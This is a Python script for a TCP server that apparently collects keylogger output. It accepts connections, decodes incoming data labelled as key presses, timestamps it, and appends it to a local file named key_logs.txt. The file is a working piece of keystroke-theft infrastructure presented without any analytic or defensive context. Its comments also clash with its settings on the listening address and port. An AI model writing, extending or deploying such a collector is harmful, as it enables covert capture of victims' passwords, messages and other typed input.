import socket
from datetime import datetime

# Server configuration
HOST = '192.168.0.100'#'192.168.91.10'  # Listen on all available interfaces
PORT = 0000        # Port to listen on

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Server listening on {HOST}:{PORT}")
        
        while True:
            conn, addr = server_socket.accept()
            print(f"Connection established with {addr}")
            
            with conn:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    key_log = data.decode('utf-8')
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    log_entry = f"{timestamp} key presses {key_log}"
                    print(log_entry)  # Print to console
                    
                    # Write to file in the same format
                    with open("key_logs.txt", "a") as log_file:
                        log_file.write(log_entry + "\n")

if __name__ == "__main__":
    start_server()
